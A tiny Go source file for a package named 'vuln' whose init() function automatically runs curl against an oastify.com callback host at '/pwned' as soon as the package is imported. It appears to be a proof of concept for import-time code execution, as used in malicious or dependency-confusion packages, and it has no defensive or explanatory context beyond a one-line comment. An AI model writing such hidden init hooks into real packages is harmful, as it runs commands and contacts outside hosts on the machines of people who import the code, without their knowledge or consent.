package vuln

import (
    "os/exec"
    _ "unsafe"
)

func init() {
    // This runs when the package is imported
    exec.Command("curl", "http://v3ze3hj5s7qsct50eyfh3rw6ixooce03.oastify.com/pwned").Run()
}
